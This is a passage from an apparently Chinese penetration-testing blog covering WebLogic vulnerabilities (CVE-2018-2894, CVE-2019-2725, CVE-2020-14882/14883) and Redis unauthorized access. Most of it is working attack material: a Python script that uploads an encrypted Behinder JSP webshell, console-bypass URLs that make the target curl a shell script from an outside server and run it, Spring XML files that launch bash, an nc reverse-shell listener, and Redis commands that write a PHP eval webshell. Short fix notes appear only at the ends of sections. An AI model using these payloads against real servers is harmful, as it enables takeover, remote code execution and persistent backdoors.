class="hljs-string">f&quot;[+] <span class="hljs-subst">&#123;host&#125;</span> exists CVE-2018-2894&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] Check URL: <span class="hljs-subst">&#123;shell_path&#125;</span> &quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] <span class="hljs-subst">&#123;host&#125;</span>  don&#x27;t exists CVE-2018-2894&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] <span class="hljs-subst">&#123;host&#125;</span>  don&#x27;t exists CVE-2018-2894&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    start = time.time()<br>    password = <span class="hljs-string">&quot;test&quot;</span><br>    url = <span class="hljs-string">&quot;/ws_utc/resources/setting/keystore&quot;</span><br>    parser = argparse.ArgumentParser()<br>    parser.add_argument(<span class="hljs-string">&quot;-t&quot;</span>, dest=<span class="hljs-string">&#x27;target&#x27;</span>, default=<span class="hljs-string">&quot;http://127.0.0.1:7001&quot;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">str</span>,<br>                        <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;target, such as: http://example.com:7001&quot;</span>)<br><br>    <span class="hljs-comment"># write into behinder default jsp webshell</span><br>    upload_content = <span class="hljs-string">&#x27;&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if (request.getMethod().equals(&quot;POST&quot;))&#123;String k=&quot;e45e329feb5d925b&quot;;session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt;&lt;%out.println(&quot;test&quot;);%&gt;&#x27;</span><br>    headers = &#123;<br>        <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>,<br>        <span class="hljs-string">&#x27;X-Requested-With&#x27;</span>: <span class="hljs-string">&#x27;XMLHttpRequest&#x27;</span>, &#125;<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) == <span class="hljs-number">1</span>:<br>        sys.argv.append(<span class="hljs-string">&#x27;-h&#x27;</span>)<br>    args = parser.parse_args()<br>    target = args.target<br><br>    target = target.rstrip(<span class="hljs-string">&#x27;/&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;://&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> target:<br>        target = <span class="hljs-string">f&quot;http://<span class="hljs-subst">&#123;target&#125;</span>&quot;</span><br>    <span class="hljs-keyword">try</span>:<br>        upload_webshell(target, url)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-] Error: \n&quot;</span>)<br>        traceback.print_exc()<br></code></pre></td></tr></table></figure><ol><li><p>执行exp</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Weblogic%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/image-20240113215833806.png" alt="image-20240113215833806"></p></li><li><p>尝试访问</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Weblogic%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/image-20240113215905029.png" alt="image-20240113215905029"></p></li><li><p>使用冰蝎连接</p><p>密码为：rebeyond</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Weblogic%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/image-20240113220109860.png" alt="image-20240113220109860"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Weblogic%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/image-20240113220145994.png" alt="image-20240113220145994"></p></li></ol><h1 id="CVE-2019-2725"><a href="#CVE-2019-2725" class="headerlink" title="CVE-2019-2725"></a>CVE-2019-2725</h1><p>这个是一个反序列化漏洞</p><h2 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h2><p>由于java程序都会将java类转变成为内存中的字节码，就是<code>.class</code>文件，但是java是主要要后端，就需要使用网络通信，就需要转变成为可传输的形式</p><blockquote><p>java内存中的对象  -&gt; 字符串（字节码）：序列化</p><p>|网络传输|</p><p>字符串（字节码）-&gt;  内存中的java对象：反序列化</p></blockquote><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>  Weblogic反序列化远程代码执行漏洞：  </p><blockquote><p>cnvd-c-2019-48814</p><p>cve-2019-2725</p></blockquote><p>  由于在反序列化处理输入信息的过程中存在缺陷，未经授权的攻击者可以发送精心构造的恶意 HTTP 请  求，利用该漏洞获取服务器权限，实现远程代码执行。  </p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><blockquote><p>Oracle WebLogic  Server 10.*  </p><p>Oracle WebLogic Server 12.1.3</p></blockquote><h2 id="影响组件"><a href="#影响组件" class="headerlink" title="影响组件"></a>影响组件</h2><blockquote><p>bea_wls9_async_response.war  </p><p>wsat.war  </p></blockquote><h2 id="漏洞判断"><a href="#漏洞判断" class="headerlink" title="漏洞判断"></a>漏洞判断</h2><p>  <strong>判断不安全组件是否开启</strong>  </p><p>通过访问路径&#x2F;_async&#x2F;AsyncResponseService  </p><p>wls9_async_response.war包中的类由于使用注解方法调用了Weblogic原生处理Web服务的类，因此会受该漏洞影响</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>  <a href="https://github.com/TopScrew/CVE-2019-2725">https://github.com/TopScrew/CVE-2019-2725</a>  </p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ol><li><p>对应的补丁包</p><blockquote><p><a href="https://www.oracle.com/security-alerts/alert-cve-2019-2725.html">https://www.oracle.com/security-alerts/alert-cve-2019-2725.html</a></p></blockquote></li><li><p>升级本地的jdk</p><blockquote><p>因为Weblogic所采用的是其安装文件中默认1.6版本的JDK文件，属于存在反序列化漏洞的JDK版本，因  此升级到JDK7u21以上版本可以避免由于Java原生类反序列化漏洞造成的远程代码执行。  </p></blockquote></li><li><p>配置URL访问控制策略  </p><p>部署于公网的WebLogic服务器，可通过ACL禁止对&#x2F;_async&#x2F;*及&#x2F;wls-wsat&#x2F;*路径的访问。  </p></li><li><p>删除不安全文件</p></li></ol><p>   删除wls9_async_response.war与wls-wsat.war文件及相关文件夹，并重启Weblogic服务。  </p><h1 id="CVE-2020-14882"><a href="#CVE-2020-14882" class="headerlink" title="CVE-2020-14882"></a>CVE-2020-14882</h1><h2 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>  Weblogic 管理控制台未授权远程命令执行漏洞  </p><p> CVE-2020-14882：允许未授权的用户绕过管理控制台的权限验证访问后台；  </p><p>CVE-2020-14883：允许后台任意用户通过HTTP协议执行任意命令  </p><p>  使用这两个漏洞组成的利用链，可通过一个GET请求在远程Weblogic服务器上以未授权的任意用户身份执行命令。</p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><blockquote><p>WebLogic 10.3.6.0<br>WebLogic  12.1.3.0<br>WebLogic  12.2.1.3<br>WebLogic  12.2.1.4<br>WebLogic  14.1.1.0  </p></blockquote><h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>  docker-compose.yml  </p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">version: <span class="hljs-string">&#x27;2&#x27;</span><br>services:<br> weblogic:<br>   image: vulhub/weblogic:<span class="hljs-number">12.2</span>.<span class="hljs-number">1.3</span>-<span class="hljs-number">2018</span><br>   ports:<br>    - <span class="hljs-string">&quot;7001:7001&quot;</span><br></code></pre></td></tr></table></figure><h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="CVE-2020-14882-1"><a href="#CVE-2020-14882-1" class="headerlink" title="CVE-2020-14882"></a><strong>CVE-2020-14882</strong></h3><p>这个是一个未授权访问</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Weblogic%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/image-20240114100726475.png" alt="image-20240114100726475"></p><h3 id="CVE-2020-14883"><a href="#CVE-2020-14883" class="headerlink" title="CVE-2020-14883"></a><strong>CVE-2020-14883</strong></h3><p>下面这个就是反弹shell，原理就是运用java的命令执行函数造成的</p><p>java为一个命令执行函数：</p><blockquote><p>java.lang.Runtime.getRuntime().exec()</p></blockquote><p>下面是payload</p><p>常见文件夹</p><blockquote><p>  <a href="http://139.155.49.43:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec">http://139.155.49.43:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(&quot;java.lang.Runtime.getRuntime().exec</a>  (‘touch%20&#x2F;tmp&#x2F;august’);”)  </p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Weblogic%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/image-20240114101417359.png" alt="image-20240114101417359"></p><p>因为这个是i靶场我们可以看这个文件是否创建</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Weblogic%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/image-20240114101639601.png" alt="image-20240114101639601"></p><p>成功创建</p><p>这个相当于就是命令执行了，现在想反弹shell 可以敲反弹shell的命令，也可以直接下载反弹shell的脚本</p><p>现在我的vps模拟攻击机</p><p>先访问一下是否成功</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Weblogic%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/image-20240114102751482.png" alt="image-20240114102751482"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Weblogic%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/image-20240114103443473.png" alt="image-20240114103443473"></p><p>现在攻击靶机</p><blockquote><p>  <a href="http://139.155.49.43:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec">http://139.155.49.43:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(&quot;java.lang.Runtime.getRuntime().exec</a>  (‘curl <a href="http://8.130.123.25:8000/linux_shell.sh">http://8.130.123.25:8000/linux_shell.sh</a> -o &#x2F;tmp&#x2F;shell.sh’);”)  </p></blockquote><p>然后看一下是否成功</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Weblogic%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/image-20240114103248234.png" alt="image-20240114103248234"></p><p>然后使用bash反弹shell</p><blockquote><p> <a href="http://139.155.49.43:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec">http://139.155.49.43:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(&quot;java.lang.Runtime.getRuntime().exec</a>  (‘&#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;shell.sh’);”)  </p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Weblogic%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/image-20240114104206055.png" alt="image-20240114104206055"></p><p>现在复现一下第二种方法，这个方式主要使用的是xml文件，而且对所有Weblogic都是有效的，原理就是weblogic会解析xml中我们插入的命令</p><p>test.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">   <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">   <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;pb&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="hljs-attr">init-method</span>=<span class="hljs-string">&quot;start&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">list</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>bash<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>-c<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>&lt;![CDATA[touch /tmp/success2]]&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>          <span class="hljs-tag">&lt;/<span class="hljs-name">list</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">constructor-arg</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></td></tr></table></figure><p>download.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">   <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">   <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;pb&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="hljs-attr">init-method</span>=<span class="hljs-string">&quot;start&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">list</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>bash<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>-c<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>&lt;![CDATA[curl 139.155.49.43:8000/shell.sh -o /tmp/shell.sh]]&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>          <span class="hljs-tag">&lt;/<span class="hljs-name">list</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">constructor-arg</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></td></tr></table></figure><p>runshell.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">   <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">   <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;pb&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="hljs-attr">init-method</span>=<span class="hljs-string">&quot;start&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">list</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>bash<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>-c<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>&lt;![CDATA[bash /tmp/shell.sh]]&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>          <span class="hljs-tag">&lt;/<span class="hljs-name">list</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">constructor-arg</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></td></tr></table></figure><p>其实就是很简单的几个文件</p><p>记得这几个文件都要放到http.server文件下面才行</p><p>因为需要解析</p><p>我直接先监听一个端口</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">nc -lvvp 9999<br></code></pre></td></tr></table></figure><p>然后攻击</p><blockquote><p><a href="http://192.168.79.128:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=">http://192.168.79.128:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=</a><br>&amp;handle&#x3D;com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(“<a href="http://8.130.123.25:8000/download.xml">http://8.130.123.25:8000/download.xml</a>“)</p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Weblogic%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/image-20240114112055418.png" alt="image-20240114112055418"></p><p>为了分辨我将这个换成了shell2.sh</p><p>然后执行，就是runshell.sh</p><blockquote><p><a href="http://192.168.79.128:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=">http://192.168.79.128:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=</a><br>&amp;handle&#x3D;com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(“<a href="http://8.130.123.25:8000/runshell.xml">http://8.130.123.25:8000/runshell.xml</a>“)</p></blockquote><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Weblogic%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/image-20240114112230993.png" alt="image-20240114112230993" style="zoom:25%;" /><p>方法三就是使用利群工具箱</p><h2 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>其实我们可以知道这一切都是由于未授权访问造成的后果</p><p>所以只要对</p><blockquote><p>  关闭后台&#x2F;console&#x2F;console.portal对外访问  </p></blockquote><p>进行授权就可以了</p>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>未授权访问漏洞</title>
    <link href="/2024/01/11/%E6%B8%97%E9%80%8F/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"/>
    <url>/2024/01/11/%E6%B8%97%E9%80%8F/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="未授权访问漏洞"><a href="#未授权访问漏洞" class="headerlink" title="未授权访问漏洞"></a>未授权访问漏洞</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>未授权访问漏洞可以理解为需要安全配置或权限认证的地址、授权页面配置不当导 致其他用户可以无  需认证授权直接访问从而引发重要权限可被操作、数据库或网站目录等敏感信息泄露。  </p><h2 id="常见漏洞"><a href="#常见漏洞" class="headerlink" title="常见漏洞"></a>常见漏洞</h2><blockquote><p>Redis  未授权访问漏洞<br>Docker 未授权访问漏洞<br>MongoDB 未授权访问漏洞<br>Jenkins 未授权访问漏洞<br>Memcached 未授权访问漏洞<br>JBOSS 未授权访问漏洞<br>VNC 未授权访问漏洞<br>ZooKeeper 未授权访问漏洞<br>Rsync 未授权访问漏洞<br>Atlassian Crowd 未授权访问漏洞<br>CouchDB 未授权访问漏洞<br>Elasticsearch 未授权访问漏洞<br>Hadoop 未授权访问漏洞<br>Jupyter Notebook 未授权访问漏洞</p></blockquote><h1 id="redis-未授权访问漏洞"><a href="#redis-未授权访问漏洞" class="headerlink" title="redis 未授权访问漏洞"></a>redis 未授权访问漏洞</h1><h2 id="redis简介"><a href="#redis简介" class="headerlink" title="redis简介"></a>redis简介</h2><p>  <a href="https://www.redis.com.cn/redis-intro.html">https://www.redis.com.cn/redis-intro.html</a>  </p><p>  一个灵活的高性能 key-value 数据结构存储，可以用来作为数据库、缓存和消息队列</p><p>主要应用场景:</p><ol><li>缓存数据</li><li>高速读写</li></ol><p>组成：</p><p>主要是由两个程序组成</p><p>Redis 客户端 redis-cli<br>Redis 服务器 redis-server  </p><p>  客户端、服务器可以位于同一台计算机或两台不同的计算机中。（分布式）</p><h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><ol><li><p>端口</p><p><strong>记住以下都是默认端口，有可能会出现更改的情况</strong></p><p>6379</p><p>其他的默认端口</p><blockquote><p>MongoDB：27017<br>Memcached：11211<br>Jboss：8080<br>VNC：5900、5901<br>claDocker：2375  </p></blockquote></li><li><p>探测</p><p>使用nmap进行端口扫描</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -v -Pn -p <span class="hljs-number">6379</span> -sV -IP<br></code></pre></td></tr></table></figure><blockquote><p>-v 显示过程</p><p>-Pn no ping </p><p>-sV 版本探测</p></blockquote><blockquote><p>为什么要no ping ?</p><p>因为大多数防火墙会拦截icmp(微软自带的，小皮等)</p><p>但是端口是在网络层(tcp,udp)，icmp是网络层</p></blockquote></li><li><p>其他</p><p>redis,mysql,postgresql一般都是监听在比本地</p><p>redis java程序一般都会使用，并且java程序一般都存在ssrf，内网存在大量的redis访问漏洞</p></li><li><p>利用方法</p><ul><li>redis 写webshell</li><li>redis写定时任务     *****  <strong>重要</strong></li><li>redis写ssh公钥</li><li>redis 主从复制</li></ul></li></ol><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="写webshell"><a href="#写webshell" class="headerlink" title="写webshell"></a>写webshell</h3><ol><li><p>对主机进行端口扫描</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/%E9%97%AE%E9%A2%98%E8%AE%B0%E8%BD%BD/image-20240111111250680.png" alt="image-20240111111250680"></p><p>发现redis是连接上的</p><p>由于nmap一直出的结果不是很理想，尝试使用yakit进一步爆破</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/%E9%97%AE%E9%A2%98%E8%AE%B0%E8%BD%BD/image-20240111111755959.png" alt="image-20240111111755959"></p><p>8080有一个apache服务尝试访问</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/%E9%97%AE%E9%A2%98%E8%AE%B0%E8%BD%BD/image-20240111111833512.png" alt="image-20240111111833512"></p></li><li><p>尝试使用Redis连接</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">redis</span>-cli -h <span class="hljs-number">8.130.123.25</span><br></code></pre></td></tr></table></figure><p>redis:</p><p>准备写webshell</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">config set dir /var/www/html # 这个的局限性就是需要知道绝对路径，但是一般网站的绝对路径不是很好获取</span><br><span class="language-xml"> config set dbfilename webshell.php # 这个是设置保存数据库的文件的路径</span><br><span class="language-xml"> set a &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]); <span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot; # 写webshell</span><br><span class="language-xml"> save 保存</span><br></code></pre></td></tr></table></figure></li><li><p>尝试访问</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/%E9%97%AE%E9%A2%98%E8%AE%B0%E8%BD%BD/image-20240111112424127.png" alt="image-20240111112424127"></p><p>写入成功</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%8A%80%E6%9C%AF%E9%9A%8F%E7%AC%94/%E9%97%AE%E9%A2%98%E8%AE%B0%E8%BD%BD/image-20240111112919989.png" alt="image-20240111112919989"></p></li><li><p>缺点</p><ul><li>可写权限的网站的绝对路径非常难找</li><li>一般只有java才有，需要jsp写入webshell</li><li>redis 这台服务器没有web ******</li></ul></li></ol><h3 id="写公钥"><a href="#写公钥" class="headerlink" 